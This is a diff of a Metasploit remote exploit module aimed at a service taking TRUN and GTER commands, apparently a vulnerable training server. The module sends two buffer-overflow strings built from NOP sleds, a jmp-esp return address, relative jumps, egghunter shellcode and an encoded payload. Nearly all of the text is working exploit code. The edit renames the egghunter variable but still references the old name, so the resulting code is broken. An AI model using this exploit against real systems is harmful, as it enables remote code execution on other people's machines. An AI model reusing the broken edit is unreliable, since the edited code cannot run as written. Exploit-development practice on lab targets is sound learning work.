@@ -60,21 +60,24 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       
   end
   def exploit	# Actual exploit
-    egghunter = "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"
+    custom_shell = "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"
     relativeshort = "\xe9\x71\xff\xff\xff"
     shellcode = payload.encoded
 
-    print_status("Connecting to target... #{datastore['RETOFFSET_GTER'] - 10 - shellcode.length()}")
+    print_status("Connecting to target...")
     s_1 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message
+    print_status("Connection 1 Created.")
+    print_status("Connecting to target...")    
     s_2 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message
+    print_status("Connection 2 Created.")
 
     outbound_TRUN = 'TRUN /.:/' + datastore['EGG_TAG'] + shellcode + "\x90"*(datastore['RETOFFSET_TRUN'] - 5 - shellcode.length() - datastore['EGG_TAG'].length()) + relativeshort + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target      
     outbound_GTER = 'GTER /.:/' + "\x90"*(10) + egghunter + "\x90"*(datastore['RETOFFSET_GTER'] - 10 - egghunter.length()) + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target
 
-    print_status("Sending Shellcode")
+    print_status("Sending Shellcode.")
     s_2.puts(outbound_TRUN)	# Send the attacking payload
 
-    print_status("Sending EggHunter")
+    print_status("Sending EggHunter.")
     s_1.puts(outbound_GTER)	# Send the attacking payload
     
   end
